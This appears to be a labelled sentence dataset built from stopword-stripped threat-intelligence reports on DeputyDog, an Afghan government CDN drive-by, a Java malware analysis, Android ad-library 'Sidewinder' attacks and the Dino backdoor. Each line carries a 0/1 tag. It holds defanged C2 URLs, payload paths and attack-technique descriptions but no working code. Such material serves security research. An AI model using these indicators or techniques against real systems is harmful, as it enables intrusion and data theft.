] com	0
The domain dll [	0
] freshdns [	0
] org resolved 58.64.199.25	0
Both ali [	0
] blankchair [	0
] com cht [	0
] blankchair [	0
] com resolved 58.64.199.22	0
A number related domains resolve IPs IPs also /24 subnet	0
For purposes blog 've chosen focus domains IP relate previously discussed DeputyDog Ephemeral Hydra campaigns	0
You may recall dll [ ] freshdns [ ] org ali [ ] blankchair [ ] com cht [ ] blankchair [ ] com linked Operation DeputyDog Operation Ephemeral Hydra	1
Figure 1 illustrates infrastructure overlaps connections observed strategic Web compromise campaign leveraging VFW 's website DeputyDog Ephemeral Hydra operations	0
Other tradecraft similarities actor ( ) responsible campaign actor ( ) responsible DeputyDog/Ephemeral Hydra campaigns include We observed many similarities exploitation side well	0
At high level attack CVE- 2013-3163 attack leveraged Flash file orchestrated exploit would call back IE JavaScript trigger IE flaw	0
The code within Flash files attack extremely similar	0
They build ROP chains shellcode way choose corrupt Flash Vector object identical functions common typos even share name	1
These actors previously targeted number different industries including The proven ability successfully deploy number different private public RATs using zero-day exploits high-profile targets likely indicates actor ( ) continue operate mid long-term	1
This entry posted Advanced Malware Exploits Targeted Attack Threat Research Vulnerabilities tagged 0day zero-day Darien Kindlund Dan Caselden Xiaobo Chen Ned Moran Mike Scott	0
Bookmark permalink	0
In day age interconnected cloud services distributed content delivery networks ( CDNs ) important CDN service providers security professionals alike recognize understand risks systems introduce within modern enterprise	0
For organizations within public private sectors leverage CDN platforms dynamically deliver web content important content also routinely monitored	0
Otherwise malicious third-party content loaded target organization 's website without knowledge delivering untold risks unwitting visitors	0
The ThreatConnect Intelligence Research Team ( TCIRT ) recently observed targeted cross-site scripting ( XSS ) '' drive-by '' attack leveraged single content delivery network resource distribute malicious Java applet via nearly major official Government Afghanistan websites	1
The compromised CDN resource question JavaScript file hosted [ http ] //cdn.afghanistan [	0
] af/scripts/gop-script.js The domain cdn.afghanistan [	0
] af legitimate CDN site used Afghan Ministry Communications IT ( MCIT ) host web content displayed used many official gov.af websites	0
The javascript URL ( [ http ] //cdn.afghanistan [	0
] af/scripts/gop-script.js ) called numerous official Afghan Government websites including following It likely javascript URL normally legitimate attackers obtained access file prepended following malicious JavaScript functions beginning script Note gov.af websites would need compromised individually attack delivered visitors sites backend CDN infrastructure serving malicious script	0
Judging last modified timestamp HTTP response gop-script.js Tue 16 Dec 2014 08:07:06 GMT malicious CDN compromise recent nature	0
In fact occurred day China 's Prime Minister Li Keqiang would meet Abdullah Abdullah Chief Executive Officer Afghanistan Astana Kazakhstan would discuss infrastructure development bilateral cooperation issues	0
Looking EXIF metadata image Keqiang meeting Abdullah hosted Chinese embassy website note Tue 16 December 2014 07:43:31 modify time well www.news [	0
] cn watermark bottom righthand corner	0
This indicates image Keqiang Abdullah likely taken edited sometime prior 07:43:31	0
While ambiguous timezone edits actually took place ( Kazakhstan China ) assume date timestamp references GMT press release states '' In afternoon December 15 local time… '' If assume photograph afternoon meeting took place sometime prior 13:43 Alma-Ata standard time ( +0600 ) would closely correspond 07:43 GMT time stamp	0
The modification gop-script.js attackers 08:07:06 GMT likely tracks extremely close window hours Keqiang met Abdullah	0
It worth mentioning similar scenario occurred June 20th security researcher PhysicalDrive0 observed malicious Java file hosted Embassy Greece Beijing	0
At time Chinese delegation led Keqiang visiting Greek Prime Minister Antonis Samaras Athens	0
Security researcher R136a1 aka '' thegoldenmessenger '' released followup blog detailed analysis Greek embassy compromise	0
While two separate events directly related additional research status ministerial official government websites around dates notable Chinese delegations bilateral meetings may yield additional patterns interest	0
Upon closer inspection prepended malicious JavaScript code one notice similarity update.javaplug-in [	0
] com naming convention URL structure C2 domain java-se [	0
] com found Palo Alto Networks blog post Attacks East Asia using Google Code Command Control associated Operation Poisoned Hurricane	0
However malicious document.write driveby URLs listed result 403 Forbidden errors December 18 2014	0
While 403 Forbidden errors may seem like analytic dead end TCIRT also identified malicious Java applet submission VirusTotal confirms nature malicious activity	0
This Java applet SHA1 388E6F41462774268491D1F121F333618C6A2C9A antivirus detections December 21st	0
The applet contains malicious class file path '' jre7u61windows/x86/Update.class ''	0
This class file downloads decodes XOR 0xC8 encoded Windows PE executable payload [ http ] //mfa.gov [ ] af/content/images/icon35.png hosted official Afghan Ministry Foreign Affairs site also affected gop-script XSS	1
Using historic context archived within ThreatConnect TCIRT concluded Java applet source code applet SHA1 ADC162DD909283097E72FC50B7AB0E04AB8A2BCC previously observed TCIRT Operation Poisoned Hurricane related URL [ http ] //jre7.java-se [	0
] com/java.jar August 15 2014	0
This applet class path downloads XOR 0xFF encoded payload executable URL [ https ] //amco- triton.co [ ] jp/js/dl/in.jpg	1
Additional indicators context associated particular Java driveby activity found ThreatConnect Common Community Incident 20140815A The XOR 0xC8 encoded payload downloaded [ http ] //mfa.gov [ ] af/content/images/icon35.png decodes Windows PE executable SHA1 This executable self-extracting ( SFX ) Microsoft Cabinet executable digitally signed valid certificate '' OnAndOn Information System Co. Ltd. '' serial number '' 1F F7 D8 64 18 1C 55 5E 70 CF DD 3A 59 34 C4 7D ''	1
This certificate also used sign Java applet downloaded malware	0
This executable drops following files Malicious DLL loads dllhost.exe using similar DLL sideloading technique commonly associated PlugX backdoor	1
This backdoor connects faux Oracle Java themed command control ( C2 ) domain oracle0876634.javaplug-in [ ] com	1
Note javaplug-in [	0
] com root domain found compromised version [ http ] //cdn.afghanistan [	0
] af/scripts/gop-script.js [ http ] //update.javaplug- [	0
] com/o/j.js confirming Java malware fact directly associated Afghan MCIT CDN XSS compromise	0
Full indicators activity YARA rule detect malware certificate found ThreatConnect Common Community Incident 20141217A Afghan Government Java Driveby signature APTOnAndOncert.yara	0
As US NATO reduce troop levels Afghanistan China posturing fill gap influence west leaving behind	0
With plans facilitate multilateral peace talks Taliban establish major transportation projects aim bolster Afghan economy Beijing eyeing Afghanistan part broader South Asian strategy	0
By exploiting co-opting Afghan network infrastructure used multiple ministerial level websites Chinese intelligence services would able widely distribute malicious payloads variety global targets using Afghanistan 's government websites topical trusted distribution platform exploiting single hidden entry point	1
This variant typical '' watering-hole '' attack attackers likely infect victims outside Afghan government happened browsing one CDN client systems specifically partner states involved planned troop reduction	1
It important consider corporate enterprises immune tactic technique used APT threat actors	0
If enterprise 's website leverages CDN speed content delivery unintended consequences must anticipated	0
Fortunately modern browsers implement security concept called '' Content Security Policy ''	0
As long server 's response headers configured properly third party content may restricted originating narrow whitelist	0
Just attackers distribute malicious content users en masse CDN services distribute web content users security professionals must able quickly distribute actionable Threat Intelligence formats readable humans machines	0
ThreatConnect industry 's first comprehensive Threat Intelligence Platform enables enterprises orchestrate aggregation Threat Intelligence multiple sources use integrated analytics robust API gives enterprises control action Threat Intelligence cloud premises	0
Register free account view Common Community shares	0
It 's friday afternoon I bit free time stumbled across tweet PhysicalDrive0 ( thx ) two hours ago thought give try finally add new article Blog ( first 2014 ) So I went Google search domain Embassy Greece Beijing added ( allegedly ) malicious java file package found PhysicalDrive0 Next I loaded 1.jar file Java Decompiler get source code	0
It showed functionality obfuscated way e.g	0
function csfn ( String paramString ) decrypts strings '' removing '' numbers string parameter There obfuscation techniques important	0
Instead following deobfuscated code line function init ( ) gives us idea actual payload located We also see java package contains file named pack open 7-Zip unpack file	0
A quick view PE viewer showed x86 PE executable even encrypted ( SHA256 b832e4b5a4829c8df6de7b42c5cb32ef25b5ab59072b4c2a7838404cd0dd5e5f ) So I opened IDA Pro take quick look functionality	0
Together strings executable get brief idea purpose malware	0
The important strings follows Together output IDA Pro see malware uses command line tool cmd.exe adding several registry keys Internet Explorer	1
It also tries retrieve possible AntiVirus information using COM interface ( dc12a687-737f-11cf-884d-00aa004b2e24 - IWbemLocator - SELECT * FROM AntiVirusProduct )	1
Furthermore makes use COM launch instance Internet Explorer ( d30c1661-cdaf-11d0-8a3e-00c04fc9e26e - IWebBrowser2 ) supposedly contact C & C server	1
To verify open Wireshark run executable	0
As result get following network information Also see downloads kind data ( Base64 encoded )	1
But first combine C & C server HTTP request open URL favorite Browser As see string named microsoft followed Base64 encoded data	0
Side note Is also Linux equivalent ? Next copy Base64 encoded data go following website let us decode file ( I feeling 's another unencrypted executable ) As result get another executable ( SHA256 a4863f44f48d1c4c050dd7baad767a86b348dd4d33924acf4e0a3cd40c6ae29f ) Base64 encoded encrypted way So fire PE viewer take look important strings Again load executable IDA Pro quickly fly assembly code get idea functionality	0
Once creates several registry entries help command line tool creates instance Internet Explorer ( CoCreateInstance ( ) - d30c1661-cdaf-11d0-8a3e- 00c04fc9e26e ) contacting C & C server	1
This time network information follows From code see sample also ability encode / decode data / Base64	1
The dynamic analysis showed malware sample contacted C & C server n't sending URL parameters ( id1 id2 )	1
Also server n't respond ...	0
The files downloaded That 's nice weekend ...	0
By 2014 number Android users grown 1.1 billion number Android devices reached 1.9 billion	0
At time enterprises also embracing Android- based Bring Your Own Device ( BYOD ) solutions	0
For example Intel 's BYOD program 20,000 Android devices across 800 combinations Android versions hardware configurations	0
Although little malware found Google Play Android apps Android system contain vulnerabilities	0
Aggressive ad libraries also leak user 's private information	1
By leveraging vulnerabilities attacker conduct targeted attacks call '' Sidewinder Targeted Attacks	1
'' In paper explain security risks attacks attacker intercept use private information uploaded ad libraries precisely locate targeted areas CEO 's office specific conference rooms	1
When target identified '' Sidewinder Targeted Attack '' exploits popular vulnerabilities ad libraries Javascript-binding-over-HTTP dynamic- loading-over-HTTP etc	0
It well-known challenge attacker call Android services injected native code n't Android application context	0
Here explain attackers invoke Android services tasks including taking photos calling phone numbers sending SMS reading from/ writing clipboard etc	1
Furthermore attackers exploit several Android vulnerabilities get valuable private information launch advanced attacks	1
Finally show threat real also prevalent due popularity Android ad libraries	0
We hope paper kickstarts conversation better protect security privacy third-party libraries harden Android security framework future	0
To understand security risks brought Sidewinder Targeted Attack first explain one possible attack mechanism ( illustrated Figure 1 ) similar Sidewinder missiles	0
The attacker hijack network targeted victim resides	1
Like infrared homing system attacker seeks '' emission '' ad libraries running target device track lock	0
Once target locked attacker launch advanced persistent attacks	0
To minimize detection chances attacker choose take action important targets ignoring devices	1
In later sections discuss attacking ( '' warhead '' ) targeting ( '' homing '' ) components detail show combination components launch powerful precise attacks target devices	1
Table 1 proposes different attacks attacker launch remotely target devices vulnerable ad libraries	1
Figure 2 shows proof-of-concept attack control interface	0
This attack targets one ad libraries described paper	0
The security risks become obvious looking attacker control interface	0
The left panel enables attacker command victim 's device including uploading local files taking pictures recording audio/video manipulating clipboard sending SMS dialing numbers implanting bootkit installing attacker 's apps uploaded Google Play etc	1
The right panel lists information stolen victim 's device	1
In screenshot victim's installed app list clipboard photo taken back camera audio clip video clip uploaded GPS location intercepted ad library	1
The panel also pins GPS location victim's device onto Google Map widget	1
Based precise position information easy identify individuals groups '' VIP '' targets offices	0
In section explain detail risks remote attacks Android devices	0
Android uses JavaScript binding method addJavascriptInterface enable JavaScript code running inside WebView access app 's Java methods ( also known Javascript bridge )	0
However widely known feature used carefully presents potential security risk running Android API 16 ( Android 4.1 )	0
As noted Google '' Use method WebView containing untrusted content could allow attacker manipulate host application unintended ways executing Java code permissions host application	1
'' In particular app running Android API 16 uses JavaScript binding method addJavascriptInterface loads content WebView HTTP attacker network could hijack HTTP traffic ( e.g. WiFi DNS hijacking ) inject malicious content WebView control host application	1
Listing 1 sample Javascript snippet execute shell command	1
We call JavaScript-Binding-Over-HTTP ( JBOH ) vulnerability	0
This applies insecure HTTPS channels well	0
If app containing vulnerability sensitive Android permissions access camera remote attacker could exploit perform sensitive tasks taking photos recording video Internet without consent	1
Based official data June 2014 ~60 % Android devices still running API≤16	0
Note API 16 platforms necessarily secure	0
If app targeting lower API level Android still run lower API level compatibility reasons	0
Figure 3 shows targeted API popular Google Play apps 50,000 downloads	0
We see large portion apps targeting API≤16	0
Starting Android 4.2 ( API 16 ) Google introduced @ JavascriptInterface anno- tation explicitly designate restrict public Java methods app accessible JavaScript running inside WebView	0
However ad library uses @ JavascriptInterface annotation expose security-sensitive interfaces uses HTTP load content WebView vulnerable attacks attacker network could inject malicious content WebView misuse interfaces exposed JS binding annotation	1
We call exposed JS binding annotation interfaces '' JS Sidedoors	0
'' For example found list sensitive Javascript interfaces publicly ex- posed certain versions real-world ad library createCalendarEvent makeCall postToSocial sendMail sendSMS takeCameraPicture getGalleryImage registerMicListener etc	0
Given ad library loads ads using HTTP host app corresponding permissions ( e.g. CALL PHONE ) attackers network abuse interfaces malicious things ( e.g. utilizing makeCall interface dial phone numbers without user 's consent )	1
Similar JBOH DEX loading HTTP insecure HTTPS ( DLOH ) another serious issue raised ad libraries	0
If attackers hijack communication channels inject malicious DEX files control behaviors victim apps	1
After getting local access attacker upload private sensitive files victim 's device modify files host app write ( e.g. directory host app SD Card FAT file system )	1
To launch sophisticated attacks like sending SMS taking pictures attackers may use Java reflection call APIs Javascript bridge	1
It appears method makes sending SMS easy	0
However operations require Android context registering Java callbacks	0
Android context provides interface global information app 's environment	0
Many Android functionalities especially remote call invocations encapsulated context	0
We discuss attacks requiring context later section	0
In section explain attacks n't need Android context discuss security risks	0
One direct threat posed JBOH use JBOH shell ( Listing 1 ) download exe- cutables use root device	1
Commercial one-touch root apps claim root 1,000 brands ( 20,000 models )	0
towelroot exploits bug found recently Linux kernel claims root new devices released June 2014	0
Thus long attackers get JBOH shell tools obtain root Android phone models	1
Even attackers ca n't obtain root attempt ptrace control host app	1
Although processes root privilege ptrace others child processes able ptrace parents	0
Because shell launched Javascript bridge child process host app ptrace host app 's process	0
Note apps android debuggable set '' true '' manifest ptraced limits adoption	0
Sending SMS require context user interaction	0
A simple call job shown Listing 2 To make calls Javascript bridge without user consent invoke telephony service dial numbers directly via binder shown Listing 3 phone remote Android telephony service number 2 represents second remote call	1
s16 type marker represents '' 16 bit string '' packageName host app 's package name obtain information posted ad libraries	0
The sequence number remote calls found corresponding Android Interface Definition Language ( AIDL ) files	0
Many Android services invoked way including sending SMS As mentioned convenient directly obtain Android context via Javascript bridge	0
Code Listing 4 example easy way get context anywhere application	0
Operations like taking pictures recording videos need register Java callbacks	0
The attackers either need boot Java VM Javascript bridge inject code host app 's Java VM	0
Fortunately Android Runtime offers another way load Java Native Interface ( JNI ) code host app using Runtime.load ( )	0
As shown Listing 5 attacker load executables compiled JNI code	1
Once loaded code obtain context described Listing 4 call DexClassLoaderload inject new classes attackers ' DEX files register callbacks take pictures/ record videos	1
There ways obtain Android context like reflecting private static context variable WebView	0
However without Java VM instances 's difficult take pictures record videos	0
After submission Black Hat April 2014 noticed MWR also concurrently independently working issue	0
They published similar mechanism June 2014	0
With Android context attacker monitor tamper clipboard	1
Android users may perform copy-paste important text content	0
For example many popular password-management apps Google Play enabling users click-and-copy passwords paste login forms	0
Malicious apps steal passwords read contents clipboard	1
Android permissions restricting apps accessing global clipboard	0
Any UID capability manipulate clipboard via API calls Listing 6 Using APIs attackers monitor changes clipboard transfer clipboard contents remote server	1
They also alter clipboard content achieve phishing goals	1
For example user may copy link visit background malicious service change link phishing site	1
We notified Google issue	0
Android Open Source Project ( AOSP ) classifies Android permissions several protec- tion levels '' normal '' '' dangerous '' '' system '' '' signature '' '' development ''	0
Dangerous permissions '' may displayed user require confirmation pro- ceeding approach may taken avoid user automatically allowing use facilities	0
'' In contrast normal permissions automatically granted installation '' without asking user 's explicit approval ( though user always option review permissions installing ) ''	0
If app requests dangerous permissions normal permissions Android displays dangerous per- missions default	0
If app requests normal permissions Android n't display permission user	0
We found certain '' normal '' permissions dangerous security impacts	0
For example attackers manipulate Android home screen icons using two normal permissions launcher READ SETTINGS WRITE SETTINGS permissions	1
These two permissions enable app query insert delete modify launcher configuration settings including icon insertion modification	0
As proof-of-concept attack scenario malicious app two permissions query/insert/ alter system icon settings modify legitimate icons security- sensitive apps banking apps phishing website	1
After notification Google patched vulnerability Android 4.4.3 released patch OEM partners	0
However according Google 7 July 2014 17.9 % Android devices using Android 4.4	0
Given Android 4.4.2 vulnerability 82.1 % Android devices vulnerable	0
With CHANGE WIFI STATE permission Android processes change proxy settings WIFI networks ( solely currently connected one )	0
To attacker use remote calls exposed WifiManager obtain WifiConfiguration objects create new proxySettings replace corresponding field	0
Note proxySettings field private Java field intended accessed processes	0
Unfortunately flexible powerful Java reflection mechanism ( especially forName ( ) getField ( ) setAccessible ( ) calls ) exposes components attackers arbitrary read write operations	0
Android audio recording via MediaRecorder APIs need user interaction consent makes easy record sound background	0
On contrary taking pictures recording videos challenging	0
First requires registering Java callbacks	0
Second Android warns '' Preview must started take picture ''	0
It seems taking pictures recording videos without user notification impossible	0
However security largely depends correct implementation enforcing flawless implementation difficult	0
On popular phones ( models anonymized security consideration ) startPreview ( ) required take pictures/record videos ; However 's highly possible devices takePicture ( ) fails check whether view presented user	0
Fortunately never witnessed case MediaRecorder shoot videos without calling setPreviewDisplay	0
But able create register dummy SurfaceView WindowManager made taking photos videos possible even devices properly checked existing preview	0
With GET ACCOUNTS USE CREDENTIALS permissions Android pro- cesses get secret tokens services ( e.g. Google services ) AccountManager use authenticate services	1
We verified Android apps two permissions authenticate user 's Google account allowing access Google Play ability send app installation requests	1
Through Javascript bridge attackers install apps choice ( e.g. attacker 's phishing app ) devices registered user 's account background without user consent	1
Combined launcher modification attack introduced earlier attackers redirect app icons ( e.g. bank email app icons ) phishing app steal user 's login credentials	1
In section explain risks victims ' devices tracked targeted ad traffic	1
It well known communication via HTTP prone hijacking data tamper- ing	0
Though ad libraries may incentive abuse users ' private sensitive data case attackers eavesdropping hijacking HTTP traffic	1
Switching HTTPS may solve issue since HTTPS security relies flawless implementation difficult	0
For example cases developer failed ( intentionally unintentionally ) check server 's certificate	0
We found popular ad libraries ( see Table 3 ) issue	0
We successfully launched Man-in-the- Middle ( MITM ) attacks intercepted data uploaded remote server	1
Note even ad libraries correct rigorous implementation SSL library may contain serious vulnerabilities exploited MITM attacks	0
Almost every ad library uploads local information Android devices	0
Based observations mostly purposes checking platform compatibility user interest targeting	0
The information frequently uploaded includes IMEI Android version manufacturer Android ID device specification carrier information host app information installed app list etc	0
Table 3 lists info uploaded top five popular ad libraries	0
Listing 7 captured packet posted remote ad server one ad libraries	0
It captured popular Google Play app	0
From packet tell device 's screen density ( d-device-screen-density ) screen size ( d-device- screen-size ) host app 's pack- age name ( u-appBId ) host app 's name ( u-appDNM ) 1 host app 's version ( u-appVer ) user agent ( h-user-agent ) localization ( d-localization ) mobile network type ( d-netType ) screen orientation ( d-orientation ) GPS location ( u-latlong-accu )	0
The important infor- mation GPS location victim 's latitude longitude location precision shown	0
It reasonable ad obtain information improve ad-serving experience	0
However information attacker precisely locate victim acquire device 's specifications	1
To locate victims effectively attacker needs monitor large-scale network traffic containing private information	0
Unfortunately several well-known attacks used achieve large-scale monitoring including DNS hijacking BGP hijacking ARP hijacking IDC	1
In context DNS hijacking done subvert resolution Domain Name System ( DNS ) queries modifying behavior DNS servers serve fake DNS information	1
DNS hijacking legally maliciously used many situations including traffic management phishing censorship	0
Attackers successfully compromised many DNS servers including ones Google Godaddy	1
By DNS hijacking attackers effectively access traffic ad servers	1
BGP hijacking takes groups IP addresses corrupting Internet routing tables breaking BGP sessions injecting fake BGP information	1
This enables attackers monitor traffic specific IPs	1
Historically many BGP hijacking attacks affected YouTube DNS root servers Yahoo many important Internet services	0
ARP hijacking ( spoofing ) IDC done hijack traffic ad server IDC ad server locates fake ARP packets	1
Attackers may rent servers close target servers use fake ARP packets direct traffic go hijacking servers first monitoring hijacking	1
ARP hijacking well-known approach used network attacks	1
Using large-scale traffic intercepted methods attackers iden- tify potential victims based information leakage GPS location described Sec- tion 4.2	1
After inject exploits targeted traffic launch attacks	1
Attackers keep low profile allowing irrelevant network traffic pass without modified	1
We used FireEye Mobile Threat Prevention ( MTP ) engine analyze ~73,000 popular apps Google Play 50,000 downloads identified 93 ad libraries	0
The detailed ad library inclusion statistics shown Figure 4	0
Seventy-one % apps contain least one ad library 35 % least two ad libraries 22.25 % include least three ad libraries	0
The largest ad inclusion number 35	0
Since Google cautious security products directly controls exclude Google Ad following discussion	0
For security considerations paper anonymize names 92 ad libraries using Ad1 Ad2 ...	0
Ad92 refer subscripts represent rankings many apps include ad libraries	0
The top five popular ad libraries ' inclusion download statistics listed Table 2	0
We analyzed 92 ad libraries found popular Google Play apps summa- rized communication channel vulnerabilities Table 3	0
Combined uploaded information column learn data attackers obtain	0
Fifty-seven 92 ad libraries popular Google Play apps JBOH issue	0
Specifically four top five ad libraries subject problem ( shown Table 2 )	0
Seven 92 ad libraries prone DLOH attacks	0
Particularly versions Ad5 Table 3 problem	0
The affected Google Play apps number accumulated download counts listed Table 4	0
In current golden age Android ad libraries Sidewinder Targeted Attacks target victims using info leakage vulnerabilities ad libraries get valuable sensitive information	1
Millions users still threat Sidewinder Targeted Attacks	0
First need improve security privacy protection ad libraries	0
For example encourage ad libraries ' publishers use HTTPS proper SSL certificate validation properly encrypt network traffic	0
They also need cautious privileged interfaces exposed ad providers case malicious ads attackers hijacking communication channels	1
Meanwhile Google needs harden security framework	0
This may prove difficult 1	0
Android complex system	0
Any sub- component 's vulnerability may impact security whole system	0
Fragmentation makes situation even challenging	0
2	0
The trade-off usability performance security always matters market demand frequently dictates security comes last	0
Many Android developers even understand program securely ( shown JBOH issue )	0
3	0
Many security patches back-ported old versions Android ( like launcher settings problem described earlier ) even though older versions widely used	0
4	0
There always information asymmetry development chain	0
For example usually takes several months vendors apply security patches Google releases	0
Albeit challenging hope work kickstart conversation improved security privacy protection third-party libraries hardened Android security framework	0
FireEye invented purpose-built virtual machine-based security platform provides real-time threat protection enterprises governments worldwide next generation cyber attacks	0
These highly sophisticated cyber attacks easily circumvent traditional signature-based defenses next-generation firewalls IPS anti-virus gateways	0
The FireEye Threat Prevention Platform provides real-time dynamic threat protection without use signatures protect organization across primary threat vectors across different stages attack life cycle	0
The core FireEye platform virtual execution engine complemented dynamic threat intelligence identify block cyber attacks real time	0
FireEye 1,900 customers across 60 countries including 130 Fortune 500	0
Security news views insight ESET experts BY JOAN CALVET POSTED 30 JUN 2015 11:12AM In blog describe sophisticated backdoor called Dino creators	0
We believe malicious software developed Animal Farm espionage group also created infamous Casper Bunny Babar malware	0
Dino contains interesting technical features also hints developers French speaking	0
Animal Farm security industry 's name group attackers first described Canada 's Communications Security Establishment ( CSE ) set slides leaked Edward Snowden March 2014	0
In slides CSE assess " moderate certainty " group French intelligence agency	0
Since several examples malware created Animal Farm found publicly documented particular	0
Casper stealthy first stage implant documented ESET last March Bunny Lua based backdoor documented Marion Marschalek ( Cyphort ) Babar espionage platform also analyzed Marion Marschalek The connection pieces malware group described CSE slides convincingly established example Paul Rascagn res ( G Data )	0
In blog post add new piece puzzle Dino another malicious program belonging Animal Farm 's arsenal	0
The sample Dino documented blog post used 2013 targets Iran	0
The original means infection unknown though believe Dino installed another program contains uninstallation command without corresponding installation procedure	0
Given set commands receive Dino 's main goal seems exfiltration files targets	1
The binary 's original name " Dino.exe " left visible authors case Casper	0
Dino – could referring pet character The Flintstones cartoon show – already mentioned recent Kaspersky blog " full featured espionage platform " technical analysis published yet	0
Roughly Dino described elaborate backdoor built modular fashion	1
Among technical innovations custom file system execute commands stealthy fashion complex task scheduling module working similar way " cron " Unix command	1
Interestingly binary contains lot verbose error messages allowing us see Dino 's developers ' choice wording	0
Also technical artefacts suggest Dino authored native French speakers	0
Dino developed C++ presents well defined modular architecture	0
The following array lists modules contained Dino binary; module names assigned developers	0
Dino heavily relies custom data structure named " DataStore " Animal Farm developers	0
In particular Dino 's modules store content inside structure making understanding one keys analyzing Dino	0
A DataStore map string keys values 8 possible types integers strings	0
The implementation data structure based hash table	0
It means retrieve value associated key one calculate hash key locate bucket value retrieved	0
Dino 's hash one byte value calculated series XOR operations key bucket starts linked list containing key / value pairs	0
The code responsible retrieving value associated key shown Figure 1	0
Finally DataStore objects serialized custom format begins magic word " DxSx "	0
This used particular PSM module save content Dino modules encrypted file	1
More precisely modification made module 's content memory PSM module saves serialized DataStore	0
When Dino restarts module deserialized file loaded memory	0
Funnily enough key serving encrypt file disk " PsmIsANiceM0du1eWith0SugarInside "	0
Dino 's configuration initially stored serialized DataStore object contained zip archive end Dino binary	0
At runtime object deserialized stored inside CORE module	0
We list configuration 's content Dino 's " conf –l CORE " command – described later – displays separate rows key 's name associated value type value	0
Started:5523F782 QWORD InitialWaitDone:00000001 DWORD InteractiveDelay:00000005 DWORD MaxNothingSaidCount:00000078 DWORD InstallDate 5523F782 QWORD fields:78537844 … [REDACTED] … 66B3900 BYTES recID:11173 01 PRS WIDESTR Version:1.2 WIDESTR BD_Keys 4D41474943424F58 … [REDACTED] … 9EB3506 BYTES CC_Keys 4D41474943424F58 … [REDACTED] … 0000000 BYTES MaxDelay:00000E10 DWORD ComServer0:hXXp://www.azhar.bf/ … [REDACTED] … /postal.php STR ComServer1:hXXp://www.rsvniima.org/ … [REDACTED] … /din12/postal.php STR ComServer2:hXXp://www.azhar.bf/ … [REDACTED] … /postal.php STR ComServer3:hXXp://www.rsvniima.org/ … [REDACTED] … /din12/postal.php STR ComServer4:hXXp://dneprorudnoe.info// … [REDACTED] … /postal.php STR ComServer5:hXXp://dneprorudnoe.info// … [REDACTED] … /postal.php STR ComServer6:hXXp://dneprorudnoe.info// … [REDACTED] … /postal.php STR NextSendReceive:5CC33097FB72D001 BYTES CC:000064F7 72E4 3F7D C817 474D A9BDBDF7 STR DaysOfLife:00000000 DWORD GUID:12FEB4A9EEDEE411B283000C29FD2872 BYTES InitialDelay:00000000 DWORD now:5523F78E QWORD hash A88E8181CA5CE35AE70C76145DFB820D BYTES InitialCommands:78537844 … [REDACTED] … 000000 BYTES xT0rvwz DC188352A … [REDACTED] … 00000 BYTES tr4qa589:K/[RAFtIP?ciD?:D STR jopcft4T a.ini WIDESTR While keys self explanatory names would like focus following keys	0
" recID " Animal Farms binaries contain ID whose decimal value appears identify target " 11173 01 PRS " case	0
For example Casper used " ID " value set " 13001 " whereas Babar samples used " 12075 01 " " 11162 01 "	0
We know meaning " PRS " suffix added case Dino	0
" ComServer " These keys contain command control ( C&C ) servers ' URLs	1
All URLs started analysis	0
Those C&Cs compromised legitimate websites standard operating procedure Animal Farm	0
" Version " Dino 's code version; set " 1.2 " confirmed " din12 " folder used one C&C URLs	0
For record " d13 " folder seen another Animal Farm C&C ( see " 3.7 Calling home " Marschalek 's Babar report ) indicating Dino version 1.3 also likely deployed point	0
" BD_Keys " " CC_Keys " contain cryptographic keys encrypt network communications C&C servers	1
Their values start word " MAGICBOX "	0
The three last keys displayed obfuscated names ( " xT0rvwz " " tr4qa589 " " jopcft4 T " ) store parameters custom file system describe later	0
The following Table lists commands accepted Dino binary names chosen developers	0
Each commands take one arguments	0
One command particular interest " search " allows operators look files precisely	1
For example provide files " .doc " extension size bigger 10 kilobytes modified last 3 days	0
We believe exfiltration files Dino 's end goal	0
At startup Dino executes successively commands stored " InitialCommands " field configuration; sample analyzed	0
Those commands serve reconnaissance step operators	0
Their execution managed CMDEXEC module commands stored queue inside CMDEXECQ module	0
The result reported C&C server	1
After described Dino 's basics going dig two particularly interesting components; first custom file system used malware CRONTAB module charge task scheduling	0
Dino contains custom file system named " ramFS " developers	1
It provides complex data structure store files memory bearing name corresponding filenames used usual file systems	1
RamFS also comes set custom commands stored files executed	0
It noticed ramFS also present Animal Farm binaries ( see attribution paragraph ) since unaware previous analysis ramFS describing findings	0
RamFS content initially stored encrypted Dino 's configuration key " xT0rvwz " whereas corresponding RC4 key stored key " tr4qa589 "	0
Once file system decrypted stored memory linked list 512 byte memory chunks one individually RC4 encrypted	0
When looking file ramFS chunk decrypted processed encrypted	0
Hence noticeable traces ramFS use	0
Here high level characteristics file system	0
Several commands executed context ramFS listed following Table	1
In case Dino ramFS serves protected storage one specific file containing instructions remove malware machine	1
The developers named file " cleaner " executed Dino receives command " killBD " ( " BD " acronym developers ' designation malware )	0
Figure 2 shows code responsible executing cleaner file	0
First retrieves name file Dino 's configuration ( " a.ini " ) retrieves key decrypt ramFS finally mounts file system memory order execute cleaner file stored inside	0
The verbosity error messages makes particularly easy understand purpose code	0
The cleaner file contains string " INSTALL A " wusvcd " U " executed uninstall malware machine – " wusvcd " name used register Dino machine	1
Hence ramFS serves protected container files executed machine offering disposable execution environment operators leaving traces system	1
The commands " cronadd " " cronlist " " crondel " serve respectively add list remove scheduled tasks registered CRONTAB module	1
Those tasks Dino 's commands	0
The syntax define scheduled tasks similar one used cron Unix command	0
In particular time run command given string following format " minute hour day month year dayofweek "	0
Alternatively string replaced " @boot " command run startup – whereas Unix cron implementations accept " @reboot "	0
As example output " cronlist " command " wakeup " command scheduled run 7th April 2015 15:44	0
As see entry identified " I " incrementing hexadecimal number starting 0xC0	0
The purpose " Local " field remains unclear ( possible value " l " )	0
The " Count " parameter counts number times command executed " 1 " indicating command executed	0
Finally " Visibility " field defines whether command execution reported C&C ( possible value " Silent " )	0
The amount shared code Dino known Animal Farm malware leaves little doubt Dino belongs Animal Farm 's arsenal	0
Among shared features cite following	0
At beginning Dino execution current process name checked process names used sandboxes	1
A similar check ( " klavme " " myapp " " TESTAPP " " afyjevmv.exe " ) present Bunny samples first stage implants deployed Animal Farm	0
To hide calls certain API functions Dino employs classic Animal Farm ploy hash calculated function 's name used look address API function	0
The actual hashing algorithm used Dino used Casper namely combination rotate left ( ROL ) 7 bits exclusive ( XOR ) operations	0
The Dino 's custom file system – called ramFS – present several droppers used Animal Farm	0
In binaries file system serves set persistence payload	0
For example command executed NBOT droppers context ramFS	0
As final indication Dino belongs Animal Farm menagerie noticeable output Dino 's sysinfo command looks like updated version " beacon " SNOWBALL implant described leaked CSE slides – part operation SNOWGLOBE led discovery Babar	0
Dino 's sysinfo example output Login / Domain ( owner ) Administrator / JOHN ( john ) Computer name JOHN Organization ( country )	0
